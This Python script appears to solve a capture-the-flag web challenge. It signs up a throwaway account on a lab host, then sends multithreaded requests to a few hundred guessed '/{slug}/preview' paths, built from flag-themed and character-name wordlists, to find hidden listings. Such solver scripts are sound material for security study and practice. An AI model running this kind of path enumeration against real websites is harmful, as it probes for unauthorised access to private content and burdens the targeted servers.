import requests, secrets, itertools
from concurrent.futures import ThreadPoolExecutor
B="http://10.0.173.208:5000"
s=requests.Session(); s.headers["User-Agent"]="Mozilla/5.0"
u="t"+secrets.token_hex(4)
s.post(f"{B}/signup",data={"username":u,"password":"Passw0rd!123"},timeout=20)
base=["flag","money","csale","csaw","secret","private","draft","hidden","real","true",
 "prize","reward","treasure","vault","gold","cash","rich","win","winner","final",
 "superdiscreteflaguser","discrete","super","admin","root","test","demo","sample",
 "pizza","sponge","worm","blindfold","blade","stickers","eggs","compass","tool",
 "walter","daenerys","krabs","gojo","maliketh","zoro","osiris","frank","benjamin"]
suf=["","-draft","-flag","-listing","-preview","-private","-secret","1","2","-1","s","-item","-real"]
pre=["","the-","my-","a-","real-","secret-","private-","flag-"]
cands=set()
for b in base:
    for a in pre:
        for z in suf:
            cands.add(f"{a}{b}{z}")
cands|= {"flag.png","flagpng","flag_draft","flag_listing","theflag","realflag","trueflag"}
cands=[c for c in cands if c and "/" not in c]
print("candidates:",len(cands))
hits=[]
def chk(c):
    try:
        r=s.get(f"{B}/{c}/preview",timeout=8,allow_redirects=False)
        if r.status_code!=404:
            return (c,r.status_code,r.headers.get("Content-Type"),len(r.content))
    except Exception: pass
with ThreadPoolExecutor(max_workers=16) as ex:
    for res in ex.map(chk,cands):
        if res: print("  HIT",res); hits.append(res)
print("done, hits:",len(hits))
